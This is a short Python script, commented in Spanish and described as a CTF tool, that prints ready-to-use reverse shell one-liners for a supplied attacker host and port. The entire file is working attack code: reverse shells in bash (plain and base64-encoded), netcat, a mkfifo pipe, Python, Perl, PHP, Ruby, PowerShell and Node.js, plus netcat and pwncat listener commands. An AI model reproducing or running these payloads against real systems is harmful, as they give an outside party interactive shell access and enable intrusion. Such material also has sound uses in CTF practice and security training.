#!/usr/bin/env python3
"""
Generador de Reverse Shells para CTF
Múltiples lenguajes y técnicas
"""

import sys
import base64

def generate_shells(lhost, lport):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        
        "bash_b64": base64.b64encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()).decode(),
        
        "nc": f"nc -e /bin/bash {lhost} {lport}",
        
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        
        "nodejs": f"(function(){{var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh',[]);var client = new net.Socket();client.connect({lport}, '{lhost}', function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();",
    }
    
    print(f"\n[*] REVERSE SHELLS PARA {lhost}:{lport}")
    print("="*50)
    
    for name, shell in shells.items():
        print(f"\n[+] {name.upper()}:")
        print(f"    {shell}")
    
    # Generar listener
    print(f"\n[*] LISTENER:")
    print(f"    nc -nlvp {lport}")
    print(f"    # O con pwncat para mejor TTY:")
    print(f"    pwncat -l {lport}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 reverse-shell-generator.py <LHOST> <LPORT>")
        sys.exit(1)
    
    generate_shells(sys.argv[1], sys.argv[2])